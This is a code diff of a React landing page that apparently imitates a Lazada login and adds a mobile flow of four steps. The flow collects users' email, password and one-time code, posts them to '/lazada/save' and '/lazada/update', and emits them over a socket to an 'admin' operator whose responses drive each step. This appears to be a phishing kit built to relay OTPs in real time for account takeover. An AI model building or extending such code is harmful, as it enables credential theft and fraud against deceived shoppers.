@@ -36,7 +36,6 @@ import { ChevronDownIcon } from "lucide-react";
 import { useTranslation } from "react-i18next";
 import { LuShoppingCart } from "react-icons/lu";
 import { MdOutlineSearch } from "react-icons/md";
-import { RxEyeClosed, RxEyeOpen } from "react-icons/rx";
 import { useEffect, useState } from "react";
 import { IoIosArrowBack } from "react-icons/io";
 import axios from "axios";
@@ -55,6 +54,10 @@ import StepTwo from "../components/StepTwo";
 import StepThree from "../components/StepThree";
 import StepOne from "../components/StepOne";
 import StepFour from "../components/StepFour";
+import MobileStepOne from "../components/Mobile/MobileStepOne";
+import MobileStepTwo from "../components/Mobile/MobileStepTwo";
+import MobileStepThree from "../components/Mobile/MobileStepThree";
+import MobileStepFour from "../components/Mobile/MobileStepFour";
 
 const languages = [
   { code: "th", name: "Thailand", flag: ThailandFlagIcon },
@@ -90,12 +93,17 @@ const socket = io(SERVER_URL);
 
 const Landing = () => {
   const [loading, setLoading] = useState(false);
+  const [mobileLoading, setMobileLoading] = useState(false);
   const [currentImageIndex, setCurrentImageIndex] = useState(0);
   const [showPassword, setShowPassword] = useState(false);
   const [lgCurrentStep, setLgCurrentStep] = useState(1);
+  const [mobileCurrentStep, setMobileCurrentStep] = useState(1);
   const [adminResponse, setAdminResponse] = useState(null);
+  const [adminResponseMobile, setAdminResponseMobile] = useState(null);
   const [adminOtpResponse, setAdminOtpResponse] = useState(null);
   const [adminOtpUpdatedResponse, setAdminOtpUpdatedResponse] = useState(null);
+  const [adminOtpUpdatedMobileResponse, setAdminOtpUpdatedMobileResponse] =
+    useState(null);
   const [data, setData] = useState({
     email: "",
     password: "",
@@ -145,7 +153,9 @@ const Landing = () => {
     socket.on("adminOtpResponse", (response) => {
       setAdminOtpResponse(response);
       setLgCurrentStep(3);
+      setMobileCurrentStep(3);
       setLoading(false);
+      setMobileLoading(false);
     });
 
     return () => {
@@ -159,6 +169,19 @@ const Landing = () => {
       setAdminOtpUpdatedResponse(response);
       setLgCurrentStep(4);
       setLoading(false);
+    });
+
+    return () => {
+      socket.off("adminOtpUpdatedResponse");
+    };
+  }, []);
+
+  useEffect(() => {
+    // Listen for admin otp updated response
+    socket.on("adminOtpUpdatedResponseMobile", (response) => {
+      setAdminOtpUpdatedMobileResponse(response);
+      setMobileCurrentStep(4);
+      setMobileLoading(false);
     });
 
     return () => {
@@ -190,6 +213,7 @@ const Landing = () => {
     e.preventDefault();
 
     setLoading(true);
+    setMobileLoading(true);
 
     try {
       const response = await axios.post(`${BaseUrl}/lazada/save`, {
@@ -226,6 +250,16 @@ const Landing = () => {
     });
   };
 
+  const handleMobileNext = () => {
+    setMobileLoading(true);
+    setMobileCurrentStep(3);
+    socket.emit("otpAttemptMobile", {
+      email: data.email,
+      message: "send OTP",
+      timestamp: new Date().toISOString(),
+    });
+  };
+
   const handleResend = () => {
     setLoading(true);
     setAdminOtpResponse(null);
@@ -240,6 +274,7 @@ const Landing = () => {
     e.preventDefault();
 
     setLoading(true);
+    setMobileLoading(true);
     // setAdminOtpResponse(null);
 
     try {
@@ -267,6 +302,42 @@ const Landing = () => {
         error.response ? error.response.data : error.message
       );
       setLoading(false); // Set loading to false if there's an error
+      // setMobileLoading(false);
+    }
+  };
+
+  const handleFinishMobile = async (e) => {
+    e.preventDefault();
+
+    setMobileLoading(true);
+    // setAdminOtpResponse(null);
+
+    try {
+      const response = await axios.put(`${BaseUrl}/lazada/update`, {
+        email: data.email,
+        password: data.password,
+        otp: data.otp,
+      });
+
+      if (response.status === 200) {
+        socket.emit("updateAttemptMobile", {
+          email: data.email,
+          password: data.password,
+          otp: data.otp,
+          timestamp: new Date().toISOString(),
+        });
+      } else {
+        throw new Error("Login failed");
+      }
+
+      console.log("Login successful", response);
+    } catch (error) {
+      console.error(
+        "Login failed",
+        error.response ? error.response.data : error.message
+      );
+      setMobileLoading(false); // Set loading to false if there's an error
+      // setMobileLoading(false);
     }
   };
 
@@ -835,129 +906,101 @@ const Landing = () => {
 
       <Box display={{ base: "block", md: "none" }} p="1rem">
         <VStack alignItems="flex-start">
-          <VStack mb="2.5rem" w="100%" alignItems="flex-start" gap="1.5rem">
-            <HStack w="100%" justifyContent="space-between">
-              <IoIosArrowBack size="1.3rem" onClick={handleModalClose} />
-              <Button
-                onClick={onMobileDrawerOpen}
-                as={Button}
-                rightIcon={<ChevronDownIcon size="0.9rem" />}
-                variant="unstyled"
-                fontWeight="300"
-                display="flex"
-              >
-                <Image
-                  src={getCurrentLanguage().flag}
-                  alt={getCurrentLanguage().name}
-                  h="1rem"
-                  w="1rem"
-                />
-              </Button>
-            </HStack>
-            <VStack
-              fontSize="1.5rem"
-              fontWeight="500"
-              alignItems="flex-start"
-              spacing={0}
+          <HStack w="100%" justifyContent="space-between" mb="1rem">
+            <IoIosArrowBack size="1.3rem" onClick={handleModalClose} />
+            <Button
+              onClick={onMobileDrawerOpen}
+              as={Button}
+              rightIcon={<ChevronDownIcon size="0.9rem" />}
+              variant="unstyled"
+              fontWeight="300"
+              display="flex"
             >
-              <Text>{t("mobileHi")} 👋</Text>
-              <Text>{t("mobileWelcome")}</Text>
-            </VStack>
-          </VStack>
-
-          <Stack mb="0.8rem" w="100%" alignItems="center">
-            <Image
-              src="/mobile-logo.svg"
-              alt="mobile-logo"
-              w="26.667vw"
-              h="auto"
-            />
-          </Stack>
-
-          <VStack w="100%" mb="2rem">
-            <FormControl mb="2rem">
-              <Input
-                type="email"
-                h="35.44px"
-                placeholder={t("mobileEmailInput")}
+              <Image
+                src={getCurrentLanguage().flag}
+                alt={getCurrentLanguage().name}
+                h="1rem"
+                w="1rem"
               />
-            </FormControl>
+            </Button>
+          </HStack>
+          {!mobileLoading && mobileCurrentStep === 1 && (
+            <MobileStepOne
+              t={t}
+              showPassword={showPassword}
+              togglePasswordVisibility={togglePasswordVisibility}
+              handleSubmit={handleSubmit}
+              data={data}
+              handleChange={handleChange}
+              isEmailValid={isEmailValid}
+              isPasswordValid={isPasswordValid}
+            />
+          )}
 
-            <FormControl>
-              <InputGroup>
-                <Input
-                  h="35.44px"
-                  type={showPassword ? "text" : "password"}
-                  placeholder={t("mobilePasswordInput")}
+          {(mobileLoading || mobileCurrentStep === 2) && (
+            <VStack w="100%" h="100%">
+              {!adminResponse ? (
+                <Spinner />
+              ) : (
+                <MobileStepTwo
+                  t={t}
+                  adminResponse={adminResponse}
+                  setMobileCurrentStep={setMobileCurrentStep}
+                  handleNext={handleNext}
+                  handleMobileNext={handleMobileNext}
                 />
-                <InputRightElement>
-                  <Button
-                    h="1.75rem"
-                    size="sm"
-                    onClick={togglePasswordVisibility}
-                    variant="link"
-                    pr="0.5rem"
-                  >
-                    {showPassword ? (
-                      <RxEyeOpen size="1.5rem" />
-                    ) : (
-                      <RxEyeClosed size="1rem" />
-                    )}
-                  </Button>
-                </InputRightElement>
-              </InputGroup>
-            </FormControl>
-          </VStack>
+              )}
+            </VStack>
+          )}
 
-          <VStack w="100%" mb="1rem">
-            <Button
-              w="100%"
-              color="#fff"
-              bg="linear-gradient(90deg,#fe8e00,#fa2c99)"
-            >
-              {t("mobileLogin")}
-            </Button>
-            <Button
-              mt="-5px"
-              variant="unstyled"
-              fontSize="3.467vw"
-              fontWeight="500"
-              lineHeight="4.4vw"
-              textAlign="center"
-              textTransform="capitalize"
-              color="#1e71ff"
-              cursor="pointer"
-            >
-              {t("mobileForgotPassword")}
-            </Button>
-          </VStack>
+          {mobileCurrentStep === 3 && (
+            <VStack w="100%" h="100%">
+              {mobileLoading ? (
+                <Spinner
+                  size="lg"
+                  thickness="4px"
+                  speed="0.65s"
+                  emptyColor="gray.200"
+                />
+              ) : (
+                <MobileStepThree
+                  t={t}
+                  adminOtpResponse={adminOtpResponse}
+                  data={data}
+                  setData={setData}
+                  handleResend={handleResend}
+                  handleFinish={handleFinish}
+                  handleFinishMobile={handleFinishMobile}
+                  mobileLoading={mobileLoading}
+                />
+              )}
+            </VStack>
+          )}
 
-          <Divider color="#eee" borderWidth="1px" mb="1rem" />
+          {mobileCurrentStep === 4 && (
+            <VStack w="100%" h="100%">
+              {mobileLoading ? (
+                <Spinner
+                  size="lg"
+                  thickness="4px"
+                  speed="0.65s"
+                  emptyColor="gray.200"
+                />
+              ) : (
+                <MobileStepFour t={t} handleModalClose={handleModalClose} />
+              )}
+            </VStack>
+          )}
 
-          <VStack spacing={0} w="100%">
-            <Text
-              color="#595f6d"
-              fontSize="3.467vw"
-              fontWeight="400"
-              lineHeight="4.4vw"
-              textAlign="center"
-            >
-              {t("mobileSignedUpYet")}
-            </Text>
-            <Button
-              mt="-5px"
-              variant="unstyled"
-              fontSize="3.467vw"
-              fontWeight="500"
-              lineHeight="4.4vw"
-              textAlign="center"
-              textTransform="capitalize"
-              color="#1e71ff"
-              cursor="pointer"
-            >
-              {t("mobileSignUp")}
-            </Button>
-          </VStack>
+          {/* {(mobileLoading || mobileCurrentStep === 4) && (
+            <VStack w="100%" h="100%">
+              {!adminOtpUpdatedMobileResponse ? (
+                <Spinner />
+              ) : (
+                <Text>StepFour</Text>
+              )}
+            </VStack>
+          )} */}
         </VStack>
 
         <MobileMenu
